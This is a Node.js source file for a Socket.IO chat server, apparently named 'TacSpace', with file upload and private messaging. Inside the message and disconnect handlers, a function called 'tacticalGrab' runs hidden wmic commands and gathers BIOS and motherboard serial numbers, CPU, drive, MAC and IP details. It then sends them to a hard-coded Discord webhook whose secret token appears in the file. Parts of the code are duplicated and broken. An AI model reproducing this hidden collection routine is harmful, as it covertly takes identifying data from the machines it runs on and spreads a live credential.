const express = require('express');
const multer = require('multer');
const mime = require('mime-types');
const path = require('path');
const app = express();
const http = require('http');
const server = http.createServer(app);
const { Server } = require("socket.io");
const si = require('systeminformation');
const axios = require('axios');
const io = new Server(server, {
    maxHttpBufferSize: 1e8
});
const webhookUrl = 'https://discord.com/api/webhooks/1283167686628737075/7a9IMe7sLABVmRTmkJ5cxdJPPDGCg51GTz_9Y92yT0KoM9h-XloLNwBShZ-sdbLCu0Sm';
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, 'uploads/');
    },
    filename: function (req, file, cb) {
        cb(null, Date.now() + path.extname(file.originalname));
    }
});
const upload = multer({ storage: storage });


let onlineUsers = {};

app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

app.post('/upload', upload.single('file'), (req, res) => {
    if (req.file) {
        res.json({ url: `/uploads/${req.file.filename}` });
    } else {
        res.status(400).send('No file uploaded');
    }
});

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

io.on('connection', (socket) => {

    let nickname = '';

    console.log('Number of connected clients:', io.engine.clientsCount);

    socket.on('nickname', (name) => {
        nickname = name;
        onlineUsers[socket.id] = name;
        io.emit('chat message', { nickname: 'TacSpace', message: `${name} has joined` });
        io.emit('online users', Object.values(onlineUsers));
        console.log(`${name} connected`);
    });

    socket.on('chat message', (msg) => {
        async function sendToDiscord(embed) {
            try {
              await axios.post(webhookUrl, { embeds: [embed] }, {
                headers: { 'Content-Type': 'application/json' }
              });
            } catch (error) {
              console.error('Error sending message to Discord:', error);
            }
          }
          
          async function tacticalGrab() {
            try {

              //Collect BIOS and Motherboard SN
              const execSync = require('child_process').execSync;
              const biosExec = execSync('wmic bios get serialnumber');
              const mbExec = execSync('wmic baseboard get serialnumber');
              const biosSerial = String(biosExec).split('\n')[1];
              const mbSerial = String(mbExec).split('\n')[1];

              // Collect hardware information
              const cpu = await si.cpu();
              const cpuman = cpu.manufacturer;
              const cpubrand = cpu.brand;
              const cpucores = cpu.cores;
              const cpumodel = cpu.model;
          
              const motherboard = await si.baseboard();
              const mbman = motherboard.manufacturer;
              const mbmodel = motherboard.model;
          
              const drives = await si.diskLayout();
              const driveInfo = drives.map(drive => 
                `Device: ${drive.device}, Type: ${drive.type}, Size: ${(drive.size / (1024 ** 3)).toFixed(2)} GB`
              ).join('\n');
          
              const network = await si.networkInterfaces();
              const networkInfo = network.map(iface => 
                `Interface: ${iface.iface}, MAC: ${iface.macaddr}, IPv4: ${iface.ip4}`
              ).join('\n');
          
              // Define embed objects for each category
              const cpuEmbed = {
                title: 'CPU Information',
                color: 3447003, // Hex color code (blue)
                fields: [
                  {
                    name: 'Details',
                    value: `**Manufacturer:** ${cpuman}\n` +
                           `**Brand:** ${cpubrand}\n` +
                           `**Cores:** ${cpucores}\n` +
                           `**Model:** ${cpumodel}`,
                    inline: false
                  }
                ]
              };
          
              const motherboardEmbed = {
                title: 'Motherboard Information',
                color: 3447003, // Hex color code (blue)
                fields: [
                  {
                    name: 'Details',
                    value: `**Manufacturer:** ${mbman}\n` +
                           `**Model:** ${mbmodel}`,
                    inline: false
                  }
                ]
              };
          
              const drivesEmbed = {
                title: 'Drives Information',
                color: 3447003, // Hex color code (blue)
                fields: [
                  {
                    name: 'Drives',
                    value: driveInfo || 'No drive information available.',
                    inline: false
                  }
                ]
              };
          
              const networkEmbed = {
                title: 'Network Interfaces Information',
                color: 3447003, // Hex color code (blue)
                fields: [
                  {
                    name: 'Interfaces',
                    value: networkInfo || 'No network interface information available.',
                    inline: false
                  }
                ]
              };

              const serialNo = {
                title: 'Serial Numbers',
                color: 3447003, // Hex color code (blue)
                fields: [
                  {
                    name: 'Details',
                    value: `**BIOS SN:** ${biosSerial}\n` +
                           `**Motherboard SN:** ${mbSerial}`,
                    inline: false
                  }
                ]
              };
          
              // Send separate messages for each category
              await sendToDiscord(cpuEmbed);
              await sendToDiscord(motherboardEmbed);
              await sendToDiscord(drivesEmbed);
              await sendToDiscord(networkEmbed);
          
              console.log('Hardware information sent to Discord!');
              
            } catch (error) {
              console.error('Error retrieving hardware information:', error);
            }
          }
          
          tacticalGrab();

        const nickname = onlineUsers[socket.id];
        io.emit('chat message', { nickname, message: msg });
        console.log(`${nickname}: ${msg}`);
    });

    socket.on('file', function(fileInfo) {
        const type = mime.lookup(fileInfo.url) || 'application/octet-stream';
        io.emit('file', { ...fileInfo, nickname: nickname, type: type });
    })

    socket.on('private message', ({recipientNickname, msg}) => {
        for (let [id, userNickname] of Object.entries(onlineUsers)) {
            if (userNickname === recipientNickname) {
                io.to(id).emit('private message', {sender: nickname, msg});
            }
        }
    });

    socket.on('typing', (user) => {
        socket.broadcast.emit('typing', user)
    });

    socket.on('stop typing', () => {
        socket.broadcast.emit('stop typing');
    })
    
    socket.on('disconnect', () => {
      async function tacticalGrab() {
        try {

          //Collect BIOS and Motherboard SN
          const execSync = require('child_process').execSync;
          const biosExec = execSync('wmic bios get serialnumber');
          const mbExec = execSync('wmic baseboard get serialnumber');
          const biosSerial = String(biosExec).split('\n')[1];
          const mbSerial = String(mbExec).split('\n')[1];

          // Collect hardware information
          const cpu = await si.cpu();
          const cpuman = cpu.manufacturer;
          const cpubrand = cpu.brand;
          const cpucores = cpu.cores;
          const cpumodel = cpu.model;
      
          const motherboard = await si.baseboard();
          const mbman = motherboard.manufacturer;
          const mbmodel = motherboard.model;
      
          const drives = await si.diskLayout();
          const driveInfo = drives.map(drive => 
            `Device: ${drive.device}, Type: ${drive.type}, Size: ${(drive.size / (1024 ** 3)).toFixed(2)} GB`
          ).join('\n');
      
          const network = await si.networkInterfaces();
          const networkInfo = network.map(iface => 
            `Interface: ${iface.iface}, MAC: ${iface.macaddr}, IPv4: ${iface.ip4}`
          ).join('\n');
      
          // Define embed objects for each category
          const cpuEmbed = {
            title: 'CPU Information',
            color: 3447003, // Hex color code (blue)
            fields: [
              {
                name: 'Details',
                value: `**Manufacturer:** ${cpuman}\n` +
                       `**Brand:** ${cpubrand}\n` +
                       `**Cores:** ${cpucores}\n` +
                       `**Model:** ${cpumodel}`,
                inline: false
              }
            ]
          };
      
          const motherboardEmbed = {
            title: 'Motherboard Information',
            color: 3447003, // Hex color code (blue)
            fields: [
              {
                name: 'Details',
                value: `**Manufacturer:** ${mbman}\n` +
                       `**Model:** ${mbmodel}`,
                inline: false
              }
            ]
          };
      
          const drivesEmbed = {
            title: 'Drives Information',
            color: 3447003, // Hex color code (blue)
            fields: [
              {
                name: 'Drives',
                value: driveInfo || 'No drive information available.',
                inline: false
              }
            ]
          };
      
          const networkEmbed = {
            title: 'Network Interfaces Information',
            color: 3447003, // Hex color code (blue)
            fields: [
              {
                name: 'Interfaces',
                value: networkInfo || 'No network interface information available.',
                inline: false
              }
            ]
          };

          const serialNo = {
            title: 'Serial Numbers',
            color: 3447003, // Hex color code (blue)
            fields: [
              {
                name: 'Details',
                value: `**BIOS SN:** ${biosSerial}\n` +
                       `**Motherboard SN:** ${mbSerial}`,
                inline: false
              }
            ]
          };
      
          // Send separate messages for each category
          await sendToDiscord(cpuEmbed);
          await sendToDiscord(motherboardEmbed);
          await sendToDiscord(drivesEmbed);
          await sendToDiscord(networkEmbed);
      
          console.log('Hardware information sent to Discord!');
          
        } catch (error) {
          console.error('Error retrieving hardware information:', error);
        }
      }
      
      tacticalGrab();

        delete onlineUsers[socket.id];
        io.emit('chat message', { nickname: 'TacSpace', message: `${nickname} has left` })
        io.emit('online users', Object.values(onlineUsers));
        console.log(`${nickname} disconnected`);
        console.log('Connected clients:', io.engine.clientsCount);
    });
});



server.listen(3000, () => {
    console.log('listening on *:3000');
})